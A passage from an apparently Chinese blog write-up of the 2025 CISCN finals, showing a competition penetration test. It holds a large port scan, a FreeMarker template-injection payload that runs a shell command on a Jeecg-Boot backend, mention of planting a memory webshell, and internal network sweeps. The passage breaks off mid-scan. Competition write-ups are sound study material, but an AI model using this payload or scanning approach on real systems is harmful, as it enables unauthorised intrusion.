
<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8" />
    <title>2025CISCN决赛 | 雲流のLowest World</title>
    <meta name="author" content="C1oudfL0w0" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
    <!-- cdn挂掉的时候要可以引用本地 -->
<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
<script src="/blog/js/vue.global.prod.min.js"></script>


<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />


<link rel="stylesheet" href="/blog/css/all.min.css" />
<link rel="stylesheet" href="/blog/css/fonts.min.css" />
<link rel="stylesheet" href="/blog/css/search.css" />
<script> const mixins = {}; </script>

<!-- 引入jQuery-->
<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
<script src="/blog/js/jquery.min.js"></script>

<!--改成了prismjs高亮-->

<script src="/blog/js/lib/prism.js"></script>
<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />



<script src="/blog/js/lib/preview.js"></script>










<script src="/blog/js/lib/home.js"></script>

<link rel="stylesheet" href="/blog/css/main.css" />
<!-- 引入不蒜子-->

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
<!-- 代码语言 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
<!-- 代码块复制 -->
<!-- 引入clipboard -->

<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
<!-- 代码块收缩 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
<!-- 代码块折行 -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
</head>

<body>
    <!--flag{never_g0nna g1ve_you up}-->

    <!-- 页面点击特效 -->
    <script type="text/javascript" src="/blog/js/love-click.js"></script>

    <!-- 浏览器标题 -->
    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>

    <!-- 动态背景 -->
    

    <!--文章目录-->
    
    <div id="toc" class="toc-article">
    <h3><i class="fas fa-stream"></i>  目录</h3>
      <div class="toc-title"></div>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Build"><span class="toc-number">2.</span> <span class="toc-text">Build</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">渗透</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#8-145-34-91"><span class="toc-number">4.</span> <span class="toc-text">8.145.34.91</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#flag01"><span class="toc-number">4.1.</span> <span class="toc-text">flag01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E6%A3%80%E6%B5%8B%E9%A1%B9"><span class="toc-number">4.2.</span> <span class="toc-text">靶场检测项</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF-day1"><span class="toc-number">5.</span> <span class="toc-text">CTF-day1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#hard-php%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">5.1.</span> <span class="toc-text">hard_php（复现）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-can"><span class="toc-number">5.2.</span> <span class="toc-text">easy_can</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF-day2"><span class="toc-number">6.</span> <span class="toc-text">CTF-day2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PIK%E8%AF%81%E4%B9%A6%E7%AD%BE%E5%8F%91"><span class="toc-number">6.1.</span> <span class="toc-text">PIK证书签发</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#AWDP"><span class="toc-number">7.</span> <span class="toc-text">AWDP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-rbac"><span class="toc-number">7.1.</span> <span class="toc-text">web-rbac</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fix"><span class="toc-number">7.1.1.</span> <span class="toc-text">fix</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#attack"><span class="toc-number">7.1.2.</span> <span class="toc-text">attack</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-security-rasp"><span class="toc-number">7.2.</span> <span class="toc-text">web-security_rasp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fix-1"><span class="toc-number">7.2.1.</span> <span class="toc-text">fix</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-ota%EF%BC%88Unsolved%EF%BC%89"><span class="toc-number">7.3.</span> <span class="toc-text">web-ota（Unsolved）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fix-2"><span class="toc-number">7.3.1.</span> <span class="toc-text">fix</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn-DarkHeap"><span class="toc-number">7.4.</span> <span class="toc-text">pwn-DarkHeap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fix-3"><span class="toc-number">7.4.1.</span> <span class="toc-text">fix</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn-embbed-httpd"><span class="toc-number">7.5.</span> <span class="toc-text">pwn-embbed_httpd</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fix-4"><span class="toc-number">7.5.1.</span> <span class="toc-text">fix</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Thinking"><span class="toc-number">8.</span> <span class="toc-text">Thinking</span></a></li></ol>
    </div>
  

    <!--返回顶部-->
    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
        <a title="返回顶部">↑</a>
    </div>
    <script src="/blog/js/totop.js"></script>

    <div id="layout">
        
            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
            
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>第一次加载文章图片可能会花费较长时间</p>
                    <p>要不挂个梯子试试？（x</p>
                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
                    <img src="/blog/images/loading.gif" />
                </div>
            </div>
        </transition>
        <transition name="into">
            <div id="main" v-show="!loading">
                <nav id="menu" ref="menu">
    <div class="desktop-menu">
        <a class="title" href="/blog/">
            <span>雲流のLOWEST WORLD</span>
        </a>
        
        <a href="/blog/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/blog/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/blog/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/blog/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/blog/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
        <a href="/blog/links">
            <i class="fa-solid fa-link fa-fw"></i>
            <span>&ensp;Links</span>
        </a>
        
        <a href="/blog/search">
            <i class="fa-solid fa-search fa-fw"></i>
            <span>&ensp;Search</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
        <div class="title" @click="showMenu = !showMenu">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;雲流のLOWEST WORLD</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="showMenu">
            
            <a href="/blog/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/blog/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/blog/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/blog/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/blog/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
            <a href="/blog/links">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-link fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
                </div>
            </a>
            
            <a href="/blog/search">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-search fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

                <div class="article">
    <div>
        <h1>2025CISCN决赛</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2025/7/21
        </span>
        
        <span class="category">
            <a href="/blog/categories/%E7%BA%BF%E4%B8%8B%E8%B5%9B/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                线下赛
            </a>
        </span>
        
        
        <!--文章字数统计-->
        
            
<div style="margin-top:10px;">
    <span class="post-time">
      <span class="post-meta-item-icon">
        <i class="fa fa-keyboard-o"></i>
        <span class="post-meta-item-text">  字数统计: </span>
        <!-- 安装插件npm install hexo-wordcount --save -->
        <span class="post-count">7.3k字</span>
      </span>
    </span>

    <span class="post-time">
      &nbsp; | &nbsp;
      <span class="post-meta-item-icon">
        <i class="fa fa-hourglass-half"></i>
        <span class="post-meta-item-text">  阅读时长: </span>
        <span class="post-count">41分</span>
      </span>
    </span>
    
    <!--不蒜子统计访问数-->
    <span id="busuanzi_container_page_pv">
    &nbsp; | &nbsp;
    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
    </span>
</div>

          
    </div>
    
    <div class="content" v-pre>
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>2025.7.19-7.20 郑州 网络安全科技馆 强网杯同款赛博厅</p>
<p>NISA-GreenSpark 位37 全国二等奖 一如去年</p>
<p>day1 渗透+CTF</p>
<p>day2 AWDP+CTF</p>
<p>今年居然又恢复申请联网了</p>
<span id="more"></span>

<hr>
<h1 id="Build"><a href="#Build" class="headerlink" title="Build"></a>Build</h1><p>构建知识库喂ai（x）</p>
<p>充当爬虫干苦力活（√）</p>
<hr>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><h1 id="8-145-34-91"><a href="#8-145-34-91" class="headerlink" title="8.145.34.91"></a>8.145.34.91</h1><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">8.145.34.91:27017 open
8.145.34.91:22 open
8.145.34.91:21 open
8.145.34.91:20880 open
8.145.34.91:8070 open
8.145.34.91:81 open
8.145.34.91:8001 open
8.145.34.91:9080 open
8.145.34.91:6868 open
8.145.34.91:80 open
8.145.34.91:8016 open
8.145.34.91:82 open
8.145.34.91:6648 open
8.145.34.91:7088 open
8.145.34.91:8089 open
8.145.34.91:8020 open
8.145.34.91:11211 open
8.145.34.91:8018 open
8.145.34.91:135 open
8.145.34.91:7008 open
8.145.34.91:7007 open
8.145.34.91:7890 open
8.145.34.91:8244 open
8.145.34.91:7000 open
8.145.34.91:83 open
8.145.34.91:1118 open
8.145.34.91:3306 open
8.145.34.91:8002 open
8.145.34.91:8028 open
8.145.34.91:7070 open
8.145.34.91:1433 open
8.145.34.91:1888 open
8.145.34.91:8222 open
8.145.34.91:7002 open
8.145.34.91:8081 open
8.145.34.91:3000 open
8.145.34.91:8008 open
8.145.34.91:8258 open
8.145.34.91:5432 open
8.145.34.91:84 open
8.145.34.91:8030 open
8.145.34.91:9081 open
8.145.34.91:6379 open
8.145.34.91:8009 open
8.145.34.91:445 open
8.145.34.91:2379 open
8.145.34.91:8082 open
8.145.34.91:7071 open
8.145.34.91:139 open
8.145.34.91:7003 open
8.145.34.91:3008 open
8.145.34.91:7004 open
8.145.34.91:8038 open
8.145.34.91:8003 open
8.145.34.91:7001 open
8.145.34.91:8010 open
8.145.34.91:85 open
8.145.34.91:8083 open
8.145.34.91:8280 open
8.145.34.91:8097 open
8.145.34.91:3128 open
8.145.34.91:2008 open
8.145.34.91:7080 open
8.145.34.91:7074 open
8.145.34.91:443 open
8.145.34.91:9082 open
8.145.34.91:1521 open
8.145.34.91:8000 open
8.145.34.91:8042 open
8.145.34.91:1082 open
8.145.34.91:8080 open
8.145.34.91:8044 open
8.145.34.91:8880 open
8.145.34.91:8443 open
8.145.34.91:86 open
8.145.34.91:8004 open
8.145.34.91:9083 open
8.145.34.91:7005 open
8.145.34.91:2020 open
8.145.34.91:1000 open
8.145.34.91:8084 open
8.145.34.91:1010 open
8.145.34.91:8360 open
8.145.34.91:9001 open
8.145.34.91:8288 open
8.145.34.91:8006 open
8.145.34.91:9085 open
8.145.34.91:3505 open
8.145.34.91:7078 open
8.145.34.91:5555 open
8.145.34.91:808 open
8.145.34.91:8087 open
8.145.34.91:8048 open
8.145.34.91:1080 open
8.145.34.91:8060 open
8.145.34.91:8012 open
8.145.34.91:801 open
8.145.34.91:8011 open
8.145.34.91:87 open
8.145.34.91:880 open
8.145.34.91:8834 open
8.145.34.91:9086 open
8.145.34.91:8848 open
8.145.34.91:8085 open
8.145.34.91:8989 open
8.145.34.91:8800 open
8.145.34.91:98 open
8.145.34.91:889 open
8.145.34.91:8099 open
8.145.34.91:8899 open
8.145.34.91:8172 open
8.145.34.91:8092 open
8.145.34.91:8838 open
8.145.34.91:8100 open
8.145.34.91:8448 open
8.145.34.91:8046 open
8.145.34.91:9087 open
8.145.34.91:8086 open
8.145.34.91:8881 open
8.145.34.91:8181 open
8.145.34.91:8053 open
8.145.34.91:2375 open
8.145.34.91:10008 open
8.145.34.91:88 open
8.145.34.91:89 open
8.145.34.91:9008 open
8.145.34.91:28018 open
8.145.34.91:9981 open
8.145.34.91:8095 open
8.145.34.91:9060 open
8.145.34.91:12018 open
8.145.34.91:9443 open
8.145.34.91:8484 open
8.145.34.91:18004 open
8.145.34.91:9084 open
8.145.34.91:8118 open
8.145.34.91:9088 open
8.145.34.91:8983 open
8.145.34.91:8088 open
8.145.34.91:8098 open
8.145.34.91:8868 open
8.145.34.91:10010 open
8.145.34.91:8090 open
8.145.34.91:8180 open
8.145.34.91:8091 open
8.145.34.91:2100 open
8.145.34.91:10250 open
8.145.34.91:8858 open
8.145.34.91:9002 open
8.145.34.91:8888 open
8.145.34.91:8069 open
8.145.34.91:18001 open
8.145.34.91:18088 open
8.145.34.91:10004 open
8.145.34.91:7200 open
8.145.34.91:14000 open
8.145.34.91:8096 open
8.145.34.91:8161 open
8.145.34.91:888 open
8.145.34.91:8094 open
8.145.34.91:10001 open
8.145.34.91:8200 open
8.145.34.91:18082 open
8.145.34.91:6080 open
8.145.34.91:9998 open
8.145.34.91:8108 open
8.145.34.91:8101 open
8.145.34.91:21000 open
8.145.34.91:91 open
8.145.34.91:18000 open
8.145.34.91:9448 open
8.145.34.91:20720 open
8.145.34.91:8093 open
8.145.34.91:1081 open
8.145.34.91:8879 open
8.145.34.91:18098 open
8.145.34.91:9010 open
8.145.34.91:9090 open
8.145.34.91:9043 open
8.145.34.91:90 open
8.145.34.91:8300 open
8.145.34.91:9800 open
8.145.34.91:18090 open
8.145.34.91:9986 open
8.145.34.91:18002 open
8.145.34.91:19001 open
8.145.34.91:16080 open
8.145.34.91:9999 open
8.145.34.91:99 open
8.145.34.91:10002 open
8.145.34.91:21501 open
8.145.34.91:21502 open
8.145.34.91:800 open
8.145.34.91:9092 open
8.145.34.91:9091 open
8.145.34.91:92 open
8.145.34.91:18080 open
8.145.34.91:20000 open
8.145.34.91:9988 open
8.145.34.91:9200 open
8.145.34.91:7688 open
8.145.34.91:9094 open
8.145.34.91:9095 open
8.145.34.91:9089 open
8.145.34.91:9093 open
8.145.34.91:7777 open
8.145.34.91:1099 open
8.145.34.91:9000 open
8.145.34.91:9099 open
8.145.34.91:9096 open
8.145.34.91:12443 open
8.145.34.91:10000 open
8.145.34.91:18008 open
8.145.34.91:9100 open
8.145.34.91:9097 open
8.145.34.91:7687 open
8.145.34.91:9098 open
8.145.34.91:7680 open
[*] alive ports len is: 218
start vulscan
[*] WebTitle http://8.145.34.91        code:200 len:14323  title:FinancePro ERP系统
[*] WebTitle http://8.145.34.91:8081   code:200 len:1766   title:""<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h2><p>8081端口 Jeecg-Boot 后台</p>
<p>直接 FreeMarker 模板注入拿shell</p>
<p><img src="/blog/2025/07/21/CISCN-2025-Final/f1b9d791-c7f3-49ca-a380-ff1b2e0973c6.png"></p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"sql"</span><span class="token operator">:</span><span class="token string">"select 'result:&lt;#assign ex=\"freemarker.template.utility.Execute\"?new()> $&#123;ex(\"cat /flag\")&#125;'"</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>内存马上线，因为 IWannaGetAll 的匹配路由问题这里需要复制过去手打</p>
<p><img src="/blog/2025/07/21/CISCN-2025-Final/b8558c03-e09e-4f1a-aa3b-f8bfda5ca94d.png"></p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">docker0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::42:28ff:fe0a:51d9  prefixlen 64  scopeid 0x20&lt;link>
        ether 02:42:28:0a:51:d9  txqueuelen 0  (Ethernet)
        RX packets 6657  bytes 305857 (305.8 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 6665  bytes 399759 (399.7 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.22.10.22  netmask 255.255.255.0  broadcast 172.22.10.255
        inet6 fe80::216:3eff:fe0c:bf7a  prefixlen 64  scopeid 0x20&lt;link>
        ether 00:16:3e:0c:bf:7a  txqueuelen 1000  (Ethernet)
        RX packets 58675  bytes 28280334 (28.2 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 71067  bytes 57811863 (57.8 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
lo: flags=73&lt;UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 169211  bytes 44490780 (44.4 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 169211  bytes 44490780 (44.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
veth0ce5688: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::10be:a7ff:fe2a:c312  prefixlen 64  scopeid 0x20&lt;link>
        ether 12:be:a7:2a:c3:12  txqueuelen 0  (Ethernet)
        RX packets 6657  bytes 399055 (399.0 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 6689  bytes 401535 (401.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>双网卡，fscan开扫</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[2025-07-19 10:48:52] [HOST] 目标:172.17.0.1 状态:alive 详情:protocol=ICMP
[2025-07-19 10:48:52] [HOST] 目标:172.17.0.2 状态:alive 详情:protocol=ICMP
[2025-07-19 10:48:55] [PORT] 目标:172.17.0.1 状态:open 详情:port=6379
[2025-07-19 10:48:56] [PORT] 目标:172.17.0.1 状态:open 详情:port=3306
[2025-07-19 10:48:56] [PORT] 目标:172.17.0.2 状态:open 详情:port=6379
[2025-07-19 10:48:56] [PORT] 目标:172.17.0.1 状态:open 详情:port=80
[2025-07-19 10:48:56] [PORT] 目标:172.17.0.1 状态:open 详情:port=22
[2025-07-19 10:48:56] [SERVICE] 目标:172.17.0.1 状态:identified 详情:os=Linux, info=Ubuntu Linux; protocol 2.0, banner=SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.13., port=22, service=ssh, version=8.2p1 Ubuntu 4ubuntu0.13, product=OpenSSH
[2025-07-19 10:48:56] [PORT] 目标:172.17.0.1 状态:open 详情:port=8081
[2025-07-19 10:48:56] [PORT] 目标:172.17.0.1 状态:open 详情:port=8080
[2025-07-19 10:49:00] [SERVICE] 目标:172.17.0.1 状态:identified 详情:port=3306, service=mysql, version=5.7.33-0ubuntu0.16.04.1, product=MySQL, banner=[.5.7.33-0ubuntu0.16.04.1.l:d:N1d.it2&#123;.) mysql_native_password
[2025-07-19 10:49:00] [SERVICE] 目标:172.17.0.1 状态:identified 详情:port=6379, service=redis, banner=-NOAUTH Authentication required..
[2025-07-19 10:49:01] [SERVICE] 目标:172.17.0.2 状态:identified 详情:port=6379, service=redis, banner=-NOAUTH Authentication required..
[2025-07-19 10:49:01] [SERVICE] 目标:172.17.0.1 状态:identified 详情:port=80, service=http, version=1.18.0, product=nginx, os=Linux, info=Ubuntu
[2025-07-19 10:49:01] [SERVICE] 目标:172.17.0.1 状态:identified 详情:info=Ubuntu, port=8081, service=http, version=1.18.0, product=nginx, os=Linux
[2025-07-19 10:49:01] [SERVICE] 目标:172.17.0.1 状态:identified 详情:port=8080, service=http
[2025-07-19 10:49:01] [SERVICE] 目标:172.17.0.1 状态:identified 详情:status_code=200, length=14323, server_info=map[content-type:text/html date:Sat, 19 Jul 2025 02:49:01 GMT etag:W/"68739225-37f3" last-modified:Sun, 13 Jul 2025 11:01:57 GMT length:14323 server:nginx/1.18.0 (Ubuntu) status_code:200 title:FinancePro ERP系统], fingerprints=[], port=80, service=http, title=FinancePro ERP系统, url=http://172.17.0.1
[2025-07-19 10:49:01] [SERVICE] 目标:172.17.0.1 状态:identified 详情:fingerprints=[], port=8080, service=http, title=HTTP Status 404 – Not Found, url=http://172.17.0.1:8080, status_code=404, length=682, server_info=map[content-language:en content-length:682 content-type:text/html;charset=utf-8 date:Sat, 19 Jul 2025 02:49:01 GMT length:682 status_code:404 title:HTTP Status 404 – Not Found]
[2025-07-19 10:49:01] [SERVICE] 目标:172.17.0.1 状态:identified 详情:url=http://172.17.0.1:8081, status_code=200, length=1766, server_info=map[accept-ranges:bytes content-language:zh-CN content-type:text/html date:Sat, 19 Jul 2025 02:49:01 GMT last-modified:Sun, 13 Jul 2025 11:02:09 GMT length:1766 server:nginx/1.18.0 (Ubuntu) status_code:200 title:"" vary:origin,access-control-request-method,access-control-request-headers,accept-encoding], fingerprints=[], port=8081, service=http, title=""<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[2025-07-19 10:49:43] [HOST] 目标:172.22.10.22 状态:alive 详情:protocol=ICMP
[2025-07-19 10:49:43] [HOST] 目标:172.22.10.17 状态:alive 详情:protocol=ICMP
[2025-07-19 10:49:43] [HOST] 目标:172.22.10.88 状态:alive 详情:protocol=ICMP
[2025-07-19 10:49:43] [HOST] 目标:172.22.10.253 状态:alive 详情:protocol=ICMP
[2025-07-19 10:49:46] [PORT] 目标:172.22.10.88 状态:open 详情:port=80
[2025-07-19 10:49:46] [PORT] 目标:172.22.10.22 状态:open 详情:port=80
[2025-07-19 10:49:46] [PORT] 目标:172.22.10.88 状态:open 详情:port=21
[2025-07-19 10:49:46] [PORT] 目标:172.22.10.17 状态:open 详情:port=22
[2025-07-19 10:49:46] [SERVICE] 目标:172.22.10.17 状态:identified 详情:port=22, service=ssh, version=8.2p1 Ubuntu 4ubuntu0.13, product=OpenSSH, os=Linux, info=Ubuntu Linux; protocol 2.0, banner=SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.13.
[2025-07-19 10:49:46] [PORT] 目标:172.22.10.88 状态:open 详情:port=135
[2025-07-19 10:49:46] [PORT] 目标:172.22.10.88 状态:open 详情:port=139
[2025-07-19 10:49:47] [PORT] 目标:172.22.10.88 状态:open 详情:port=445
[2025-07-19 10:49:47] [PORT] 目标:172.22.10.22 状态:open 详情:port=22
[2025-07-19 10:49:47] [SERVICE] 目标:172.22.10.22 状态:identified 详情:port=22, service=ssh, version=8.2p1 Ubuntu 4ubuntu0.13, product=OpenSSH, os=Linux, info=Ubuntu Linux; protocol 2.0, banner=SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.13.
[2025-07-19 10:49:47] [PORT] 目标:172.22.10.22 状态:open 详情:port=3306
[2025-07-19 10:49:47] [SERVICE] 目标:172.22.10.22 状态:identified 详情:port=3306, service=mysql, version=5.7.33-0ubuntu0.16.04.1, product=MySQL, banner=[.5.7.33-0ubuntu0.16.04.1.! 2(.e.3L *.%!AT6g mysql_native_password
[2025-07-19 10:49:49] [PORT] 目标:172.22.10.22 状态:open 详情:port=6379
[2025-07-19 10:49:51] [SERVICE] 目标:172.22.10.88 状态:identified 详情:service=http, port=80
[2025-07-19 10:49:51] [SERVICE] 目标:172.22.10.22 状态:identified 详情:service=http, version=1.18.0, product=nginx, os=Linux, info=Ubuntu, port=80
[2025-07-19 10:49:52] [SERVICE] 目标:172.22.10.88 状态:identified 详情:port=139, service=unknown, banner=.
[2025-07-19 10:49:52] [SERVICE] 目标:172.22.10.88 状态:identified 详情:port=445, service=unknown
[2025-07-19 10:49:52] [PORT] 目标:172.22.10.22 状态:open 详情:port=8080
[2025-07-19 10:49:52] [PORT] 目标:172.22.10.22 状态:open 详情:port=8081
